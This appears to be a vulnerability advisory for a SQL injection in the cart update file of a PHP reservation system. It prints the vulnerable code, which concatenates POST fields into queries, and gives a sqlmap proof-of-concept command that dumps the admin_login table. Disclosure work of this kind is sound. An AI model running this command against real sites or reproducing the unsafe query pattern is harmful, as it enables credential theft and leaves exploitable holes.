# SQL Injection Vulnerability in update.php (Cart Update)

**Project**: Online Product Reservation System In PHP With Source Code

**Vendor**: Source Code & Projects (code-projects.org)
**Download Link**: https://code-projects.org/online-product-reservation-system-in-php-with-source-code/

**Vulnerable File**: app/checkout/update.php

**Version**: V1.0

**Description**:

A critical SQL injection vulnerability exists in the shopping cart update functionality. The application directly concatenates POST parameters into SQL UPDATE and SELECT queries without validation, allowing attackers to extract cart and product data.

### Analyse

**Vulnerability: SQL Injection in UPDATE and SELECT Queries**

```php
<?php include('../../config/config.php'); ?>
<?php
// Line 3-4: User input from POST without validation
$id = $_POST['id'];
$qty = $_POST['qty'];

// Line 5: VULNERABLE! Direct concatenation into UPDATE query
mysql_query("UPDATE cart SET qty = '$qty' WHERE prod_id = '$id'") or die(mysql_error());

// Line 7: VULNERABLE! Direct concatenation into SELECT query
$update = mysql_query("SELECT * FROM cart LEFT JOIN products on cart.prod_id = products.id WHERE products.id = '$id'") or die(mysql_error());
$_price= mysql_fetch_array($update);
$_updated_price = $_price['qty'] * $_price['price'];
	echo "<input type='text'  id='des' class='sum' value='".$_updated_price."' />";
?>
```

**Vulnerability Analysis**:

1. **Multiple Injection Points**: Both `id` and `qty` POST parameters vulnerable
2. **UPDATE Query Injection**: Line 5 allows modification of cart data
3. **SELECT Query Injection**: Line 7 allows extraction of product and cart data
4. **No Input Validation**: POST parameters not validated before use
5. **No Prepared Statements**: Uses deprecated `mysql_query()` function
6. **Error Disclosure**: MySQL errors directly displayed to user

### POC

```bash
sqlmap -u "http://localhost:8081/app/checkout/update.php" \
  --data="id=1&qty=1" \
  --batch \
  -D cj_handgunner \
  -T admin_login \
  --dump
```

![1767458618705.png](https://youke3.picui.cn/s1/2026/01/04/6959470659e9d.png)

**References**:
- OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
- CWE-89: https://cwe.mitre.org/data/definitions/89.html
